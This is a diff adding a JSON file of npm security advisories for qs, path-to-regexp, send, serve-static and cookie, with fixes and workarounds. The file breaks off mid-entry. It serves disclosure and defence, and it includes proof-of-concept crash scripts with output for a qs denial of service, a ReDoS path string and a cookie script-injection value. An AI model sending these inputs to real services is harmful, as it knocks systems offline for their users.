@@ -1,0 +1,1362 @@
+{
+  "advisories": [
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-37ch-88jc-xwx2/GHSA-37ch-88jc-xwx2.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "path-to-regexp",
+            "purl": "pkg:npm/path-to-regexp"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "0.1.13"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2024-45296",
+        "CVE-2026-4867",
+        "GHSA-9wv6-86v2-598j"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-1333"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-03-27T20:04:53Z",
+        "nvd_published_at": "2026-03-26T17:16:42Z",
+        "severity": "HIGH"
+      },
+      "details": "### Impact\n\nA bad regular expression is generated any time you have three or more parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b-:c` or `/:a-:b-:c-:d`. The backtrack protection added in `path-to-regexp@0.1.12` only prevents ambiguity for two parameters. With three or more, the generated lookahead does not block single separator characters, so capture groups overlap and cause catastrophic backtracking.\n\n### Patches\n\nUpgrade to [path-to-regexp@0.1.13](https://github.com/pillarjs/path-to-regexp/releases/tag/v.0.1.13)\n\nCustom regex patterns in route definitions (e.g., `/:a-:b([^-/]+)-:c([^-/]+)`) are not affected because they override the default capture group.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b-:c` to `/:a-:b([^-/]+)-:c([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length.\n\n### References\n\n- [GHSA-9wv6-86v2-598j](https://github.com/advisories/GHSA-9wv6-86v2-598j)\n- [Detailed blog post: ReDoS the web](https://blakeembrey.com/posts/2024-09-web-redos/)",
+      "id": "GHSA-37ch-88jc-xwx2",
+      "modified": "2026-09-10T03:50:36.768786245Z",
+      "published": "2026-03-27T20:04:53Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-37ch-88jc-xwx2"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-4867"
+        },
+        {
+          "type": "WEB",
+          "url": "https://blakeembrey.com/posts/2024-09-web-redos"
+        },
+        {
+          "type": "WEB",
+          "url": "https://cna.openjsf.org/security-advisories.html"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/advisories/GHSA-9wv6-86v2-598j"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pillarjs/path-to-regexp"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/releases/tag/v.0.1.13"
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "summary": "path-to-regexp vulnerable to Regular Expression Denial of Service via multiple route parameters"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-4mjr-xmp4-gh2g/GHSA-4mjr-xmp4-gh2g.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "qs",
+            "purl": "pkg:npm/qs"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "2.2.5"
+                },
+                {
+                  "fixed": "6.16.0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-82417"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-248",
+          "CWE-703"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-09-02T14:45:13Z",
+        "nvd_published_at": "2026-08-30T00:16:34Z",
+        "severity": "MODERATE"
+      },
+      "details": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` \u2192 `stringify` round-trip \u2014 no `JSON.parse` \u2014 turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset \u2014 via `qs`'s own recommended `plainObjects` mitigation \u2014 and triggers an uncaught exception during a `parse` \u2192 `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` \u2014 the standard round-trip in gateways and request-forwarders \u2014 then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` \u2014 pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` \u2014 the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` \u2014 worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse->stringify -> TypeError\nnode poc02_isBuffer.js                      # minimal defect -> TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -> uncaught throw -> exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' && typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+      "id": "GHSA-4mjr-xmp4-gh2g",
+      "modified": "2026-09-10T03:51:14.991984096Z",
+      "published": "2026-09-02T14:45:13Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/ljharb/qs/security/advisories/GHSA-4mjr-xmp4-gh2g"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82417"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ljharb/qs/commit/e83d321ffafb38cf210683ac31714fce6ce1c6c6"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/ljharb/qs"
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "summary": "qs: Denial of Service via Attacker Controlled isBuffer"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-6rw7-vpxm-498p/GHSA-6rw7-vpxm-498p.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "qs",
+            "purl": "pkg:npm/qs"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "6.14.1"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2025-15284"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-20"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2025-12-30T21:02:54Z",
+        "nvd_published_at": "2025-12-29T23:15:42Z",
+        "severity": "MODERATE"
+      },
+      "details": "### Summary\n\nThe `arrayLimit` option in qs did not enforce limits for bracket notation (`a[]=1&a[]=2`), only for indexed notation (`a[0]=1`). This is a consistency bug; `arrayLimit` should apply uniformly across all array notations.\n\n**Note:** The default `parameterLimit` of 1000 effectively mitigates the DoS scenario originally described. With default options, bracket notation cannot produce arrays larger than `parameterLimit` regardless of `arrayLimit`, because each `a[]=value` consumes one parameter slot. The severity has been reduced accordingly.\n\n### Details\n\nThe `arrayLimit` option only checked limits for indexed notation (`a[0]=1&a[1]=2`) but did not enforce it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Note on parameterLimit interaction:** The original advisory's \"DoS demonstration\" claimed a length of 10,000, but `parameterLimit` (default: 1000) caps parsing to 1,000 parameters. With default options, the actual output is 1,000, not 10,000.\n\n### Impact\n\nConsistency bug in `arrayLimit` enforcement. With default `parameterLimit`, the practical DoS risk is negligible since `parameterLimit` already caps the total number of parsed parameters (and thus array elements from bracket notation). The risk increases only when `parameterLimit` is explicitly set to a very high value.",
+      "id": "GHSA-6rw7-vpxm-498p",
+      "modified": "2026-09-10T03:50:31.670581449Z",
+      "published": "2025-12-30T21:02:54Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-15284"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/ljharb/qs"
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:L",
+          "type": "CVSS_V4"
+        }
+      ],
+      "summary": "qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-9wv6-86v2-598j/GHSA-9wv6-86v2-598j.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "path-to-regexp",
+            "purl": "pkg:npm/path-to-regexp"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0.2.0"
+                },
+                {
+                  "fixed": "1.9.0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        },
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-9wv6-86v2-598j/GHSA-9wv6-86v2-598j.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "path-to-regexp",
+            "purl": "pkg:npm/path-to-regexp"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "0.1.10"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        },
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-9wv6-86v2-598j/GHSA-9wv6-86v2-598j.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "path-to-regexp",
+            "purl": "pkg:npm/path-to-regexp"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "7.0.0"
+                },
+                {
+                  "fixed": "8.0.0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        },
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-9wv6-86v2-598j/GHSA-9wv6-86v2-598j.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "path-to-regexp",
+            "purl": "pkg:npm/path-to-regexp"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "2.0.0"
+                },
+                {
+                  "fixed": "3.3.0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        },
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-9wv6-86v2-598j/GHSA-9wv6-86v2-598j.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "path-to-regexp",
+            "purl": "pkg:npm/path-to-regexp"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "4.0.0"
+                },
+                {
+                  "fixed": "6.3.0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2024-45296",
+        "CVE-2026-4867",
+        "GHSA-37ch-88jc-xwx2"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-1333"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2024-09-09T20:19:15Z",
+        "nvd_published_at": "2024-09-09T19:15:13Z",
+        "severity": "HIGH"
+      },
+      "details": "### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)\n- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)\n- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)\n- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `/:a-:b` will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n* [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n* [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)",
+      "id": "GHSA-9wv6-86v2-598j",
+      "modified": "2026-09-10T03:50:18.832560863Z",
+      "published": "2024-09-09T20:19:15Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-9wv6-86v2-598j"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45296"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/commit/925ac8e3c5780b02f58cbd4e52f95da8ad2ac485"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/commit/d31670ae8f6e69cbfd56e835742195b7d10942ef"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/commit/f1253b47b347dcb909e3e80b0eb2649109e59894"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pillarjs/path-to-regexp"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20250124-0001"
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
+          "type": "CVSS_V4"
+        }
+      ],
+      "summary": "path-to-regexp outputs backtracking regular expressions"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-cm22-4g7w-348p/GHSA-cm22-4g7w-348p.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "serve-static",
+            "purl": "pkg:npm/serve-static"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "1.16.0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        },
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-cm22-4g7w-348p/GHSA-cm22-4g7w-348p.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "serve-static",
+            "purl": "pkg:npm/serve-static"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "2.0.0"
+                },
+                {
+                  "fixed": "2.1.0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2024-43800"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-79"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2024-09-10T19:42:33Z",
+        "nvd_published_at": "2024-09-10T15:15:17Z",
+        "severity": "LOW"
+      },
+      "details": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in serve-static 1.16.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
+      "id": "GHSA-cm22-4g7w-348p",
+      "modified": "2026-09-10T03:50:18.868190591Z",
+      "published": "2024-09-10T19:42:33Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/serve-static/security/advisories/GHSA-cm22-4g7w-348p"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43800"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/serve-static/commit/0c11fad159898cdc69fd9ab63269b72468ecaf6b"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/serve-static/commit/ce730896fddce1588111d9ef6fdf20896de5c6fa"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/expressjs/serve-static"
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:L",
+          "type": "CVSS_V4"
+        }
+      ],
+      "summary": "serve-static vulnerable to template injection that can lead to XSS"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-m6fv-jmcg-4jfg/GHSA-m6fv-jmcg-4jfg.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "send",
+            "purl": "pkg:npm/send"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "0.19.0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2024-43799"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-79"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2024-09-10T19:42:41Z",
+        "nvd_published_at": "2024-09-10T15:15:17Z",
+        "severity": "LOW"
+      },
+      "details": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in send 0.19.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template",
+      "id": "GHSA-m6fv-jmcg-4jfg",
+      "modified": "2026-09-10T03:50:18.939403414Z",
+      "published": "2024-09-10T19:42:41Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/send/security/advisories/GHSA-m6fv-jmcg-4jfg"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43799"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/send/commit/ae4f2989491b392ae2ef3b0015a019770ae65d35"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pillarjs/send"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2025/06/msg00022.html"
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:L",
+          "type": "CVSS_V4"
+        }
+      ],
+      "summary": "send vulnerable to template injection that can lead to XSS"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/10/GHSA-pxg6-pf52-xh8x/GHSA-pxg6-pf52-xh8x.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "cookie",
+            "purl": "pkg:npm/cookie"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "0.7.0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2024-47764"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-74"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2024-10-04T20:31:00Z",
+        "nvd_published_at": null,
+        "severity": "LOW"
+      },
+      "details": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
+      "id": "GHSA-pxg6-pf52-xh8x",
+      "modified": "2026-09-10T03:50:19.898971417Z",
+      "published": "2024-10-04T20:31:00Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jshttp/cookie/pull/167"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jshttp/cookie"
+        }
+      ],
+      "schema_version": "1.9.0",
+      "summary": "cookie accepts cookie name, path, and domain with out of bounds characters"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-qw6h-vgh9-j6wx/GHSA-qw6h-vgh9-j6wx.json"
+          },
+          "package": {
